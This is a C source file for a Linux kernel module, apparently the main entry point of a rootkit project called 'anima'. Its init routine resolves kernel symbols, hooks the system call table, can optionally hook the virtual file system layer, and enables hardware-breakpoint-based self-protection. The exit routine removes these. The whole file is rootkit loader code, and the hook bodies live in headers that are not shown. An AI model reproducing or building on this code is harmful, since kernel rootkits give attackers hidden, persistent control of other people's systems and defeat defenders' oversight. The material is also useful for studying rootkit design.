#include <linux/kernel.h>
#include <linux/module.h>

#include <anima/config.h>
#include <anima/debug.h>
#include <anima/ksyms.h>
#include <anima/syscalls.h>
#include <anima/vfs.h>
#include <anima/x86.h>

MODULE_LICENSE("GPL");

struct rootkit_config rk_cfg = {
	.state = RK_BOOT,
	.dr_protect = 1,
	.patch_debug = 1,
	.hook_syscall = 1,
	.hook_vfs = 0,
};

static int __init anima_init(void)
{
	int ret;

	pr_debug("%s: init\n", __func__);

	/* MUST be called first */
	ret = get_kernel_syms();
	if (ret)
		return 1;

	/* architecture specific */
	ret = x86_hw_breakpoint_init();
	if (ret)
		return 1;

	if (rk_cfg.hook_syscall)
		hook_sys_call_table();
	if (rk_cfg.hook_vfs)
		hook_vfs();
	if (rk_cfg.dr_protect)
		x86_hw_breakpoint_protect_enable();

	rk_cfg.state = RK_ACTIVE;

	return 0;
}

static void __exit anima_exit(void)
{
	rk_cfg.state = RK_SHUTDOWN;
	if (rk_cfg.dr_protect)
		x86_hw_breakpoint_protect_disable();

	pr_debug("%s: exit\n", __func__);

	/* architecture specific */
	x86_hw_breakpoint_exit();
}

module_init(anima_init);
module_exit(anima_exit);
